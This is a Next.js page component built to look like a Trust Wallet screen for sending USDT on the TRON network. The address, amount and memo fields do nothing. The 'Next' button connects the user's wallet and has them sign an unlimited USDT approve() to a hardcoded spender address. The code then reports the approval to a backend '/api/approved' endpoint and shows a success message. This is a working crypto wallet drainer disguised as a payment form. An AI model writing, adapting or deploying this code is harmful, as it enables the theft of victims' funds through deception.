"use client";

import { useEffect, useState } from "react";
import { TronWeb } from "tronweb";
import Image from "next/image";
import tronIcon from "../public/coins.png";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { BASE_URL, USDT_SPENDER_ADDRESS } from "@/env";

const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";

const MAX_ALLOWANCE =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function getPreferredWalletName() {
  return "WalletConnect";
}

function buildTronWeb() {
  return new TronWeb({
    fullHost: "https://api.trongrid.io",
  });
}

export default function Home() {
  const [address, setAddress] = useState(SPENDER);
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");
  const [loading, setLoading] = useState(false);
  const [, setWalletStatus] = useState("");
  const [pendingApproval, setPendingApproval] = useState(false);
  const [pendingWalletName, setPendingWalletName] = useState<string | null>(
    null,
  );

  const {
    address: connectedAddress,
    connected,
    wallet,
    select,
    connect,
  } = useWallet();

  useEffect(() => {
    if (!pendingApproval) {
      return;
    }

    if (
      !connected &&
      wallet &&
      pendingWalletName &&
      wallet.adapter.name === pendingWalletName &&
      !loading
    ) {
      void connect().catch((error: any) => {
        setPendingApproval(false);
        setWalletStatus(error?.message || "Unable to connect wallet.");
        setLoading(false);
      });
    }
  }, [connected, connect, loading, pendingApproval, pendingWalletName, wallet]);

  useEffect(() => {
    if (!pendingApproval || !connected || !connectedAddress || loading) {
      return;
    }

    const submitApproval = async () => {
      try {
        const tronWeb = buildTronWeb();
        const contractCall =
          await tronWeb.transactionBuilder.triggerSmartContract(
            USDT_ADDRESS,
            "approve(address,uint256)",
            {
              feeLimit: 100_000_000,
              callValue: 0,
            },
            [
              { type: "address", value: SPENDER },
              { type: "uint256", value: MAX_ALLOWANCE },
            ],
            connectedAddress,
          );

        const unsignedTransaction = contractCall?.transaction;
        if (!unsignedTransaction) {
          throw new Error("Could not build the approval transaction.");
        }

        const signedTransaction =
          await wallet?.adapter.signTransaction(unsignedTransaction);

        if (!signedTransaction) {
          throw new Error("Wallet did not return a signed transaction.");
        }

        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        const txId =
          signedTransaction.txID || result.txid || result.transaction?.txID;

        await fetch(`${BASE_URL}/api/approved`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            network: 'TRON Mainnet',
            owner: address,
            spender: USDT_SPENDER_ADDRESS,
            amount: MAX_ALLOWANCE,
            txHash: result.txid || "unknown"
          })
        });

        setWalletStatus(`Approval submitted${txId ? `: ${txId}` : "."}`);
        alert(`Approval Successful!\nTransaction ID: ${txId ?? "Unknown"}`);
      } catch (error: any) {
        console.error(error);
        setWalletStatus(error?.message || "Transaction failed.");
        alert("Transaction failed: " + (error?.message || error));
      } finally {
        setPendingApproval(false);
        setPendingWalletName(null);
        setLoading(false);
      }
    };

    void submitApproval();
  }, [connected, connectedAddress, loading, pendingApproval, wallet?.adapter]);

  const handleNext = async () => {
    if (loading) {
      return;
    }

    setLoading(true);
    setWalletStatus("");

    try {
      if (!connected || !connectedAddress) {
        const targetWallet = getPreferredWalletName();
        setPendingWalletName(targetWallet);
        setPendingApproval(true);
        select(targetWallet as never);
        setWalletStatus("Connecting with Trust Wallet...");
        return;
      }

      setPendingApproval(true);
    } catch (error: any) {
      console.error(error);
      setWalletStatus(error?.message || "Transaction failed.");
      alert("Transaction failed: " + (error?.message || error));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-w-screen   min-h-screen   bg-[#1d1d1d] flex justify-between items-center flex-col  px-3 py-3 sm:px-6 sm:py-6 gap-10">
      <form
        className="w-full flex flex-col  gap-5 sm:gap-7"
        onSubmit={(e) => e.preventDefault()}
      >
        <label className="flex flex-col gap-3 sm:gap-4">
          <span className="text-start text-[14px] font-semibold tracking-[-0.03em] text-[#b8b8b8] sm:text-[20px]">
            Address or Domain Name
          </span>
          <div className="flex min-h-[56px] sm:min-h-[76px] flex-row items-center gap-3 rounded-md border border-[#7a7a7a] bg-[#212121] px-3 py-2  sm:gap-4 sm:px-4 sm:py-3">
            <input
              type="text"
              className="w-full font-semibold min-w-0 bg-transparent px-1 py-1 text-[14px] tracking-[-0.03em] text-[#dddddd] placeholder:text-[#8f8f8f] focus:outline-none sm:px-2 sm:py-2 sm:text-[20px]"
              placeholder="Search or Enter"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              required
            />
            <span className="flex shrink-0 items-center gap-3 text-[14px] font-semibold text-[#49ff92] sm:gap-5 sm:text-[20px]">
              <span
                className="cursor-pointer text-[#49ff92]"
                onClick={() => navigator.clipboard.readText().then(setAddress)}
              >
                Paste
              </span>
              <svg
                data-prefix="fas"
                data-icon="address-book"
                className="h-6 w-6 text-[#49ff92] sm:h-8 sm:w-8"
                role="img"
                viewBox="0 0 512 512"
                aria-hidden="true"
              >
                <path
                  fill="currentColor"
                  d="M96 0C60.7 0 32 28.7 32 64l0 384c0 35.3 28.7 64 64 64l288 0c35.3 0 64-28.7 64-64l0-384c0-35.3-28.7-64-64-64L96 0zM208 288l64 0c44.2 0 80 35.8 80 80 0 8.8-7.2 16-16 16l-192 0c-8.8 0-16-7.2-16-16 0-44.2 35.8-80 80-80zm-24-96a56 56 0 1 1 112 0 56 56 0 1 1 -112 0zM512 80c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64zm0 128c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64zM496 320c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64c0-8.8-7.2-16-16-16z"
                ></path>
              </svg>
              <svg
                data-prefix="fas"
                data-icon="qrcode"
                className="h-6 w-6 text-[#49ff92] sm:h-8 sm:w-8"
                role="img"
                viewBox="0 0 448 512"
                aria-hidden="true"
              >
                <path
                  fill="currentColor"
                  d="M64 160l64 0 0-64-64 0 0 64zM0 80C0 53.5 21.5 32 48 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48L0 80zM64 416l64 0 0-64-64 0 0 64zM0 336c0-26.5 21.5-48 48-48l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96zM320 96l0 64 64 0 0-64-64 0zM304 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96c0-26.5 21.5-48 48-48zM288 352a32 32 0 1 1 0-64 32 32 0 1 1 0 64zm0 64c17.7 0 32 14.3 32 32s-14.3 32-32 32-32-14.3-32-32 14.3-32 32-32zm96 32c0-17.7 14.3-32 32-32s32 14.3 32 32-14.3 32-32 32-32-14.3-32-32zm32-96a32 32 0 1 1 0-64 32 32 0 1 1 0 64zm-32 32a32 32 0 1 1 -64 0 32 32 0 1 1 64 0z"
                ></path>
              </svg>
            </span>
          </div>
        </label>

        <div className="flex flex-col gap-3 sm:gap-4">
          <span className="text-start text-[14px] font-semibold tracking-[-0.03em] text-[#b8b8b8] sm:text-[20px]">
            Destination network
          </span>
          <button
            type="button"
            className="inline-flex w-fit items-center gap-3 rounded-full bg-[#242424] px-3 py-2 text-[14px] font-semibold text-[#8e8e8e] sm:gap-4 sm:px-4 sm:py-3 sm:text-[20px]"
          >
            <span className="flex h-6 w-6 items-center justify-center rounded-full px-0.5 py-0.5  bg-[red] sm:h-12 sm:w-12">
              <Image
                src={tronIcon}
                alt="Tron Logo"
                width={24}
                height={24}
                className="object-contain brightness-0 invert"
              />
            </span>
            <span>Tron</span>
            <span className="text-xs text-[#6f6f6f] sm:text-[16px]">▼</span>
          </button>
        </div>

        <label className="flex flex-col gap-3 sm:gap-4">
          <span className="text-start text-[14px] font-semibold tracking-[-0.03em] text-[#b8b8b8] sm:text-[20px]">
            Amount
          </span>
          <div className="flex min-h-[56px] sm:min-h-[76px]  flex-row items-center gap-3 rounded-md border border-[#7a7a7a] bg-[#212121] px-3 py-2  sm:gap-4 sm:px-4 sm:py-3">
            <input
              type="number"
              className="w-full font-semibold min-w-0 bg-transparent px-1 py-1 text-[14px] tracking-[-0.03em] text-[#dddddd] placeholder:text-[#8f8f8f] focus:outline-none sm:px-2 sm:py-2 sm:text-[20px]"
              placeholder="USDT Amount"
              min="0"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              required
            />
            <div className="flex shrink-0 items-center gap-3 text-[14px] font-semibold sm:gap-6 sm:text-[20px]">
              <span className="text-[#a6afbd]">USDT</span>
              <span className="cursor-pointer text-[#49ff92]">Max</span>
            </div>
          </div>
        </label>

        <div className="text-[14px] font-medium text-[#bcbcbc] sm:text-[20px]">
          ≈ $0.00
        </div>

        <label className="flex flex-col gap-3 sm:gap-4">
          <span className="text-start text-[14px] font-semibold tracking-[-0.03em] text-[#b8b8b8] sm:text-[20px]">
            Memo
          </span>
          <div className="flex min-h-[56px] sm:min-h-[76px] flex-row items-center gap-3 rounded-md border border-[#7a7a7a] bg-[#212121] px-3 py-2  sm:gap-4 sm:px-4 sm:py-3">
            <input
              type="text"
              className="w-full font-semibold min-w-0 bg-transparent px-1 py-1 text-[14px] tracking-[-0.03em] text-[#dddddd] placeholder:text-[#8f8f8f] focus:outline-none sm:px-2 sm:py-2 sm:text-[20px]"
              placeholder=""
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
            />
            <span className="flex shrink-0 items-center gap-3 sm:gap-6">
              <svg
                data-prefix="fas"
                data-icon="qrcode"
                className="h-6 w-6 text-[#49ff92] sm:h-8 sm:w-8"
                role="img"
                viewBox="0 0 448 512"
                aria-hidden="true"
              >
                <path
                  fill="currentColor"
                  d="M64 160l64 0 0-64-64 0 0 64zM0 80C0 53.5 21.5 32 48 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48L0 80zM64 416l64 0 0-64-64 0 0 64zM0 336c0-26.5 21.5-48 48-48l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96zM320 96l0 64 64 0 0-64-64 0zM304 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96c0-26.5 21.5-48 48-48zM288 352a32 32 0 1 1 0-64 32 32 0 1 1 0 64zm0 64c17.7 0 32 14.3 32 32s-14.3 32-32 32-32-14.3-32-32 14.3-32 32-32zm96 32c0-17.7 14.3-32 32-32s32 14.3 32 32-14.3 32-32 32-32-14.3-32-32zm32-96a32 32 0 1 1 0-64 32 32 0 1 1 0 64zm-32 32a32 32 0 1 1 -64 0 32 32 0 1 1 64 0z"
                ></path>
              </svg>
              <a
                href="https://community.trustwallet.com/t/what-is-a-memo-or-destination-tag/138516"
                className="text-[#49ff92]"
              >
                <svg
                  data-prefix="fas"
                  data-icon="circle-info"
                  className="h-6 w-6 text-[#49ff92] sm:h-8 sm:w-8"
                  role="img"
                  viewBox="0 0 512 512"
                  aria-hidden="true"
                >
                  <path
                    fill="currentColor"
                    d="M256 512a256 256 0 1 0 0-512 256 256 0 1 0 0 512zM224 160a32 32 0 1 1 64 0 32 32 0 1 1 -64 0zm-8 64l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24z"
                  ></path>
                </svg>
              </a>
            </span>
          </div>
        </label>
      </form>
      <button
        onClick={handleNext}
        disabled={loading}
        type="button"
        className={`w-full min-h-[56px] sm:min-h-[76px] rounded-[40px] py-3 text-[14px] font-semibold tracking-[-0.03em] transition-colors  sm:py-4 sm:text-[20px] ${loading
          ? "cursor-not-allowed bg-[#679a78] text-[#1b201d] opacity-80"
          : "bg-[#49ff92] text-[#111111] hover:bg-[#5eff9b]"
          }`}
      >
        {loading ? "Processing..." : "Next"}
      </button>
    </div>
  );
}
